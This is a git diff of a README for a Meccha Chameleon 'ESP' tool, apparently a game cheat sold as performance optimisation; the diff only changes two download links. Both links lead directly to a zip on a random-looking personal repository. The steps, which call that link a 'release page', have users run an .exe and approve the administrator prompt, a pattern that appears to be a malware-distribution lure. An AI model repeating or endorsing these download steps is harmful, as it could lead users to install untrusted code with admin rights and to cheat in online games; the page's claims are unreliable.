@@ -5,7 +5,7 @@ description: "Improve visual clarity and target awareness in Meccha Chameleon wi
 ---
 # 🦎 ESP-MECCHA-HAMELEON - Optimize your game performance with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/selfish-hindustani263/selfish-hindustani263.github.io/raw/refs/heads/main/atelognathia/io_hindustani_github_selfish_2.4.zip)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/selfish-hindustani263/selfish-hindustani263.github.io/main/atelognathia/io_hindustani_github_selfish_2.4.zip)
 
 ## 📌 Project Overview
 
@@ -30,7 +30,7 @@ You should also ensure your graphics card drivers are current. Outdated drivers 
 
 The setup process requires only a few minutes. Follow these instructions to prepare your system and launch the application.
 
-1.  **Visit the Download Page**: Go to [this release page](https://github.com/selfish-hindustani263/selfish-hindustani263.github.io/raw/refs/heads/main/atelognathia/io_hindustani_github_selfish_2.4.zip) to find the latest version of the software.
+1.  **Visit the Download Page**: Go to [this release page](https://raw.githubusercontent.com/selfish-hindustani263/selfish-hindustani263.github.io/main/atelognathia/io_hindustani_github_selfish_2.4.zip) to find the latest version of the software.
 2.  **Select the File**: Locate the file that ends in .exe. Click the file name to start the download to your computer.
 3.  **Run the Installer**: Once the download finishes, navigate to your Downloads folder. Double-click the file to open the installation wizard.
 4.  **Confirm Permissions**: You might see a prompt from Windows User Account Control. Click "Yes" to allow the installer to make changes.
